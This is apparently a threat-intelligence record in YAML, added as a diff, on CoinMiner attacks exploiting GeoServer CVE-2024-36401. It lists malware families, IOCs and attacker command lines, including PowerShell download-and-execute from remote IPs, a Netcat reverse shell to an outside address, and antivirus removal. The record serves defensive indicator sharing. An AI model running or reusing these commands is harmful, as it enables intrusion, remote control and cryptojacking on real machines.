@@ -1,0 +1,61 @@
+description: CoinMiner attacks exploiting GeoServer vulnerability CVE-2024-36401,
+  targeting unpatched installations to install malware like NetCat and XMRig.
+attribution: Earth Baxia threat actor
+malware_families:
+- GOREVERSE
+- SideWalk
+- Mirai
+- Condi
+- CoinMiner
+TTPs:
+  processes:
+  - PowerShell
+  - Netcat
+  - XMRig
+  commandline:
+  - 'PowerShell: IEX(New-ObjectNet.WebClient).DownloadString(hxxp://182.218.82.[1]4/js/1/gw.txt)'
+  - "(New-Object Net.WebClient).DownloadFile('http://212.78.4.241:8081/docs/nc.exe','C:/programdata/userinit.exe')"
+  - "cmd /c copy C:\Windows\System32\cmd.exe C:\ProgramData\c.exe"
+  - "Start-Process 'C:\ProgramData\userinit.exe' -ArgumentList '-e','C:\ProgramData\c.exe','107.180.100.247','88'"
+  - 'cmd /c taskkill /f /im avgrec.exe'
+  - 'cmd /c del /f /q C:\Windows\System32\avgrec.exe'
+  - 'cmd /c md C:\Windows\System32\avgrec.exe'
+  - 'cmd /c md C:\ProgramData\firebirds'
+  - '$ne = $MyInvocation.MyCommand.Path'
+  - '$geo_url = "http://182.218.82.14/js/1/s.rar"'
+  - '$geo_name = "javae"'
+  - '$geo_cfg_url = "http://182.218.82.14/js/1/config.json"'
+  - '$geo_cfg_name = "config.json"'
+  - '$geo_path = "C:\ProgramData\firebirds\javae.exe"'
+  - '$geo_cfg_path = "C:\ProgramData\firebirds\config.json"'
+  - '$javae=Get-Process -Name javae |select-object CPU'
+  - "$javae=$javae -Replace 'CPU','' -Replace '@{=','' -Replace '}','"
+  powershell:
+  - adminc.ps1
+  scripting_engine:
+  - Bash script for XMRig installation
+  network_connections:
+  - executable: NetCat
+    destination_address: pool.supportxmr.com
+    port: '443'
+  file_activity:
+  - downloaded PowerShell script to install NetCat
+  - downloaded Bash script and configuration file for XMRig
+  persistence:
+    cron_jobs:
+    - command executed from Pastebin
+process_relations:
+- GeoServer vulnerability exploitation leading to PowerShell execution
+IOCs:
+  domains:
+  - hxxp://182.218.82.[1]4/js/1/gw.txt
+  - pool.supportxmr.com
+  hashes: []
+  IPs: []
+  URLs:
+  - hxxp://182.218.82.[1]4/js/1/gw.txt
+authors:
+- AhnLab Security Intelligence Center (ASEC)
+reference: https://asec.ahnlab.com/en/88917/
+date_of_publication: July 06, 2025
+file_creation_date: July 09, 2025
